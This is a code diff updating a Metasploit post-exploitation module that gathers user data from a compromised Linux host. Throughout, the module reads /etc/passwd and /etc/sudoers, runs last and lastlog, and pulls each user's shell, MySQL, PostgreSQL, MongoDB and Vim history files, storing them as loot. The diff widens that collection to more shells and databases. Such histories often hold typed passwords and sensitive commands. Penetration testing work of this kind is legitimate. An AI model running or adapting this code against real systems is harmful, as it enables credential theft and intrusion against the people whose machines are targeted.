@@ -11,50 +11,57 @@ class Metasploit3 < Msf::Post
   include Msf::Post::File
   include Msf::Post::Linux::System
 
-
-  def initialize(info={})
-    super( update_info( info,
-        'Name'          => 'Linux Gather User History',
-        'Description'   => %q{
-          This module gathers user specific information.
-          User list, bash history, mysql history, vim history,
-          lastlog and sudoers.
-        },
-        'License'       => MSF_LICENSE,
-        'Author'        =>
-          [
-            # based largely on get_bash_history function by Stephen Haywood
-            'ohdae <bindshell[at]live.com>'
-          ],
-        'Platform'      => ['linux'],
-        'SessionTypes'  => ['shell', 'meterpreter']
-      ))
-
+  def initialize(info = {})
+    super(update_info(info,
+      'Name'         => 'Linux Gather User History',
+      'Description'  => %q{
+        This module gathers the following user-specific information:
+        shell history, MySQL history, PostgreSQL history, MongoDB history,
+        Vim history, lastlog, and sudoers.
+      },
+      'License'      => MSF_LICENSE,
+      'Author'       =>
+        [
+          # based largely on get_bash_history function by Stephen Haywood
+          'ohdae <bindshell[at]live.com>'
+        ],
+      'Platform'     => ['linux'],
+      'SessionTypes' => ['shell', 'meterpreter']
+    ))
   end
 
   def run
     distro = get_sysinfo
 
-    print_good("Info:")
+    print_good('Info:')
     print_good("\t#{distro[:version]}")
     print_good("\t#{distro[:kernel]}")
 
-    users = execute("/bin/cat /etc/passwd | cut -d : -f 1")
-    user = execute("/usr/bin/whoami")
+    user = execute('/usr/bin/whoami')
+    users = execute('/bin/cat /etc/passwd | cut -d : -f 1').chomp.split
+    users = [user] if user != 'root' || users.blank?
 
-    mount = execute("/bin/mount -l")
-    get_bash_history(users, user)
-    get_sql_history(users, user)
-    get_vim_history(users, user)
-    last = execute("/usr/bin/last && /usr/bin/lastlog")
-    sudoers = cat_file("/etc/sudoers")
+    vprint_status("Retrieving history for #{users.length} users")
+    shells = %w{ash bash csh ksh sh tcsh zsh}
+    users.each do |u|
+      home = get_home_dir(u)
+      shells.each do |shell|
+        get_shell_history(u, home, shell)
+      end
+      get_mysql_history(u, home)
+      get_psql_history(u, home)
+      get_mongodb_history(u, home)
+      get_vim_history(u, home)
+    end
 
-    save("Last logs", last) unless last.nil?
-    save("Sudoers", sudoers) unless sudoers.nil? || sudoers =~ /Permission denied/
+    last = execute('/usr/bin/last && /usr/bin/lastlog')
+    sudoers = cat_file('/etc/sudoers')
+    save('Last logs', last) unless last.blank?
+    save('Sudoers', sudoers) unless sudoers.blank? || sudoers =~ /Permission denied/
   end
 
-  def save(msg, data, ctype="text/plain")
-    ltype = "linux.enum.users"
+  def save(msg, data, ctype = 'text/plain')
+    ltype = 'linux.enum.users'
     loot = store_loot(ltype, ctype, session, data, nil, msg)
     print_status("#{msg} stored in #{loot.to_s}")
   end
@@ -62,91 +69,66 @@ class Metasploit3 < Msf::Post
   def get_host
     case session.type
     when /meterpreter/
-      host = sysinfo["Computer"]
+      host = sysinfo['Computer']
     when /shell/
-      host = session.shell_command_token("hostname").chomp
+      host = session.shell_command_token('hostname').chomp
     end
-
     print_status("Running module against #{host}")
-
-    return host
+    host
   end
 
   def execute(cmd)
     vprint_status("Execute: #{cmd}")
     output = cmd_exec(cmd)
-    return output
+    output
   end
 
   def cat_file(filename)
     vprint_status("Download: #{filename}")
     output = read_file(filename)
-    return output
+    output
   end
 
-  def get_bash_history(users, user)
-    if user == "root" and users != nil
-      users = users.chomp.split()
-      users.each do |u|
-        if u == "root"
-          vprint_status("Extracting history for #{u}")
-          hist = cat_file("/root/.bash_history")
-        else
-          vprint_status("Extracting history for #{u}")
-          hist = cat_file("/home/#{u}/.bash_history")
-        end
-
-        save("History for #{u}", hist) unless hist.nil? || hist =~ /No such file or directory/
+  def get_home_dir(user)
+    home = execute("echo ~#{user}")
+    if home.empty?
+      if user == 'root'
+        home = '/root'
+      else
+        home = "/home/#{user}"
       end
-    else
-      vprint_status("Extracting history for #{user}")
-      hist = cat_file("/home/#{user}/.bash_history")
-      vprint_status(hist)
-      save("History for #{user}", hist) unless hist.nil? || hist =~ /No such file or directory/
     end
+    home
   end
 
-  def get_sql_history(users, user)
-    if user == "root" and users != nil
-      users = users.chomp.split()
-      users.each do |u|
-        if u == "root"
-          vprint_status("Extracting SQL history for #{u}")
-          sql_hist = cat_file("/root/.mysql_history")
-        else
-          vprint_status("Extracting SQL history for #{u}")
-          sql_hist = cat_file("/home/#{u}/.mysql_history")
-        end
-
-        save("History for #{u}", sql_hist) unless sql_hist.nil? || sql_hist =~ /No such file or directory/
-      end
-    else
-      vprint_status("Extracting SQL history for #{user}")
-      sql_hist = cat_file("/home/#{user}/.mysql_history")
-      vprint_status(sql_hist) if sql_hist
-      save("SQL History for #{user}", sql_hist) unless sql_hist.nil? || sql_hist =~ /No such file or directory/
-    end
+  def get_shell_history(user, home, shell)
+    vprint_status("Extracting #{shell} history for #{user}")
+    hist = cat_file("#{home}/.#{shell}_history")
+    save("#{shell} history for #{user}", hist) unless hist.blank? || hist =~ /No such file or directory/
   end
 
-  def get_vim_history(users, user)
-    if user == "root" and users != nil
-      users = users.chomp.split
-      users.each do |u|
-        if u == "root"
-          vprint_status("Extracting VIM history for #{u}")
-          vim_hist = cat_file("/root/.viminfo")
-        else
-          vprint_status("Extracting VIM history for #{u}")
-          vim_hist = cat_file("/home/#{u}/.viminfo")
-        end
-
-        save("VIM History for #{u}", vim_hist) unless vim_hist.nil? || vim_hist =~ /No such file or directory/
-      end
-    else
-      vprint_status("Extracting history for #{user}")
-      vim_hist = cat_file("/home/#{user}/.viminfo")
-      vprint_status(vim_hist)
-      save("VIM History for #{user}", vim_hist) unless vim_hist.nil? || vim_hist =~ /No such file or directory/
-    end
+  def get_mysql_history(user, home)
+    vprint_status("Extracting MySQL history for #{user}")
+    sql_hist = cat_file("#{home}/.mysql_history")
+    save("MySQL history for #{user}", sql_hist) unless sql_hist.blank? || sql_hist =~ /No such file or directory/
   end
+
+  def get_psql_history(user, home)
+    vprint_status("Extracting PostgreSQL history for #{user}")
+    sql_hist = cat_file("#{home}/.psql_history")
+    save("PostgreSQL history for #{user}", sql_hist) unless sql_hist.blank? || sql_hist =~ /No such file or directory/
+  end
+
+  def get_mongodb_history(user, home)
+    vprint_status("Extracting MongoDB history for #{user}")
+    sql_hist = cat_file("#{home}/.dbshell")
+    save("MongoDB history for #{user}", sql_hist) unless sql_hist.blank? || sql_hist =~ /No such file or directory/
+  end
+
+  def get_vim_history(user, home)
+    vprint_status("Extracting Vim history for #{user}")
+    vim_hist = cat_file("#{home}/.viminfo")
+    save("Vim history for #{user}", vim_hist) unless vim_hist.blank? || vim_hist =~ /No such file or directory/
+  end
+
 end
